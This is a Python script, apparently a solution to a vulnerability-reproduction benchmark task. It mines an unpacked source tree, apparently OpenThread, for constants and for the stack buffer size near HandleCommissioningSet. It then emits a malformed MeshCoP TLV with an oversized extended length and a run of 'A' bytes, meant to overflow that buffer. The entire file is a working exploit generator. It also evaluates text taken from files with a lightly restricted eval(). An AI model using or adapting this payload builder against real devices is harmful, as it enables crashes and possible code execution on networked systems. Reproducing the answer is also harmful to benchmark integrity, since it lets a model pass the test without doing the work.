import os
import re
import tarfile
import tempfile
from typing import Dict, Optional, List, Tuple


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx",
    ".h", ".hh", ".hpp", ".hxx",
    ".inc", ".ipp", ".inl",
    ".S", ".s",
    ".txt", ".md",
}


def _is_probably_text_path(path: str) -> bool:
    _, ext = os.path.splitext(path)
    return ext in _TEXT_EXTS


def _read_text_file(path: str, max_bytes: int = 3_000_000) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size > max_bytes:
            return None
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return None
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


_NUM_SUFFIX_RE = re.compile(r"(?<=\b)(0x[0-9a-fA-F]+|\d+)(?:[uUlL]{1,4})\b")
_CAST_RE = re.compile(r"\(\s*(?:u?int(?:8|16|32|64)_t|size_t|unsigned|signed|long|short|char|bool)\s*\)")
_STATIC_CAST_RE = re.compile(r"static_cast\s*<[^>]+>\s*\(")


def _strip_comments(text: str) -> str:
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    text = re.sub(r"//.*?$", "", text, flags=re.M)
    return text


def _sanitize_expr(expr: str) -> str:
    expr = expr.strip()
    expr = _strip_comments(expr)
    expr = _STATIC_CAST_RE.sub("(", expr)
    expr = expr.replace(")", ")")
    expr = _CAST_RE.sub("", expr)
    expr = expr.replace("::", "__")
    expr = _NUM_SUFFIX_RE.sub(lambda m: m.group(1), expr)
    expr = re.sub(r"\btrue\b", "1", expr)
    expr = re.sub(r"\bfalse\b", "0", expr)
    expr = expr.replace("~", " ~")
    expr = re.sub(r"\s+", " ", expr).strip()
    return expr


_ALLOWED_EXPR_RE = re.compile(r"^[0-9A-Za-z_ \t()+\-*/%<>&|^~]+$")


def _try_eval_expr(expr: str, consts: Dict[str, int]) -> Optional[int]:
    expr = _sanitize_expr(expr)
    if not expr or len(expr) > 200:
        return None
    if not _ALLOWED_EXPR_RE.match(expr):
        return None

    def repl_name(m: re.Match) -> str:
        name = m.group(0)
        if name in ("and", "or", "not"):
            return name
        if name in consts:
            return str(consts[name])
        if "__" in name:
            tail = name.split("__")[-1]
            if tail in consts:
                return str(consts[tail])
        return name

    expr2 = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b", repl_name, expr)

    if re.search(r"\b[A-Za-z_][A-Za-z0-9_]*\b", expr2):
        return None

    try:
        value = eval(expr2, {"__builtins__": None}, {})
    except Exception:
        return None
    if isinstance(value, bool):
        return int(value)
    if not isinstance(value, int):
        return None
    return value


_CONST_LINE_PATTERNS = [
    re.compile(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*$"),
    re.compile(r"^\s*(?:static\s+)?(?:constexpr|const)\s+(?:unsigned\s+)?(?:u?int(?:8|16|32|64)_t|size_t|int|long|short)\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*;\s*$"),
    re.compile(r"^\s*static\s+constexpr\s+auto\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*;\s*$"),
    re.compile(r"^\s*enum\s*{\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*}\s*;\s*$"),
]


_ENUM_BLOCK_RE = re.compile(r"\benum\b[^;{]*\{(.*?)\}\s*;", re.S)
_ENUM_ENTRY_RE = re.compile(r"\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^,}]+)")


def _extract_constants_from_text(text: str) -> Dict[str, int]:
    out: Dict[str, int] = {}
    text_nc = _strip_comments(text)
    lines = text_nc.splitlines()
    for line in lines:
        if len(line) > 400:
            continue
        for pat in _CONST_LINE_PATTERNS:
            m = pat.match(line)
            if not m:
                continue
            name, expr = m.group(1), m.group(2)
            v = _try_eval_expr(expr, out)
            if v is None:
                continue
            if -10_000_000 <= v <= 10_000_000:
                out[name] = v
            break

    for m in _ENUM_BLOCK_RE.finditer(text_nc):
        body = m.group(1)
        for em in _ENUM_ENTRY_RE.finditer(body):
            name, expr = em.group(1), em.group(2)
            v = _try_eval_expr(expr, out)
            if v is None:
                continue
            if -10_000_000 <= v <= 10_000_000:
                out[name] = v
    return out


def _merge_consts(global_consts: Dict[str, int], new_consts: Dict[str, int]) -> None:
    for k, v in new_consts.items():
        if k not in global_consts:
            global_consts[k] = v


def _iter_source_files(root: str) -> List[str]:
    files: List[str] = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            if _is_probably_text_path(path):
                files.append(path)
    return files


def _find_tlv_type(root: str, consts: Dict[str, int]) -> int:
    preferred_names = [
        "kSteeringData",
        "kBorderAgentLocator",
        "kCommissionerId",
        "kCommissionerSessionId",
        "kJoinerUdpPort",
        "kProvisioningUrl",
    ]
    for name in preferred_names:
        if name in consts and 0 <= consts[name] <= 255:
            return consts[name] & 0xFF

    patterns = []
    for name in preferred_names:
        patterns.append(re.compile(r"\b" + re.escape(name) + r"\b\s*=\s*(0x[0-9a-fA-F]+|\d+)\b"))

    for path in _iter_source_files(root):
        text = _read_text_file(path)
        if not text:
            continue
        t = _strip_comments(text)
        for pat in patterns:
            m = pat.search(t)
            if m:
                s = m.group(1)
                try:
                    v = int(s, 0)
                except Exception:
                    continue
                if 0 <= v <= 255:
                    return v & 0xFF

    return 8  # common MeshCoP SteeringData TLV type


_HANDLE_NAME_RE = re.compile(r"\bHandleCommissioningSet\b")


_ARRAY_DECL_RE = re.compile(
    r"\b(?:uint8_t|int8_t|char|uint16_t|uint32_t|uint64_t|size_t)\s+[A-Za-z_][A-Za-z0-9_]*\s*\[\s*([^\]\n;]+)\s*\]"
)


def _find_buf_size_near_handle(root: str, consts: Dict[str, int]) -> Optional[int]:
    candidates: List[int] = []
    for path in _iter_source_files(root):
        text = _read_text_file(path)
        if not text:
            continue
        if "HandleCommissioningSet" not in text:
            continue
        for m in _HANDLE_NAME_RE.finditer(text):
            start = m.start()
            window = text[start:start + 15000]
            window_nc = _strip_comments(window)
            for am in _ARRAY_DECL_RE.finditer(window_nc):
                expr = am.group(1).strip()
                v = _try_eval_expr(expr, consts)
                if v is None:
                    expr2 = expr.replace("::", "__")
                    v = _try_eval_expr(expr2, consts)
                if v is None:
                    continue
                if 32 <= v <= 16384:
                    candidates.append(int(v))

    if candidates:
        return max(candidates)

    alt = []
    for k, v in consts.items():
        if not (32 <= v <= 16384):
            continue
        lk = k.lower()
        if ("commission" in lk or "dataset" in lk) and ("max" in lk) and ("len" in lk or "length" in lk or "size" in lk):
            alt.append(v)
    if alt:
        return max(alt)

    return None


def _pick_invariant_extended_length(required: int) -> int:
    if required <= 0:
        required = 1
    if required <= 257:
        n = 2  # 0x0202 = 514, safely above 255 and endianness-invariant
    else:
        n = (required + 256) // 257
        if n < 2:
            n = 2
    if n > 255:
        n = 255
    return n * 257  # 0xNNNN


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = src_path
        tmpdir_obj = None

        if os.path.isfile(src_path):
            tmpdir_obj = tempfile.TemporaryDirectory()
            root = tmpdir_obj.name
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(root)
            except Exception:
                pass

        consts: Dict[str, int] = {}
        for path in _iter_source_files(root):
            text = _read_text_file(path)
            if not text:
                continue
            new_consts = _extract_constants_from_text(text)
            if new_consts:
                _merge_consts(consts, new_consts)

        tlv_type = _find_tlv_type(root, consts)
        buf_size = _find_buf_size_near_handle(root, consts)

        if buf_size is None:
            required = 1025  # aim to overflow typical 1k-ish stack buffers
        else:
            required = int(buf_size) + 1
            if required < 257:
                required = 257

        value_len = _pick_invariant_extended_length(required)
        if value_len < 257:
            value_len = 514
        if value_len > 0xFFFF:
            value_len = 0xFFFF

        poc = bytes([tlv_type & 0xFF, 0xFF]) + int(value_len).to_bytes(2, "big") + (b"A" * value_len)

        if tmpdir_obj is not None:
            try:
                tmpdir_obj.cleanup()
            except Exception:
                pass

        return poc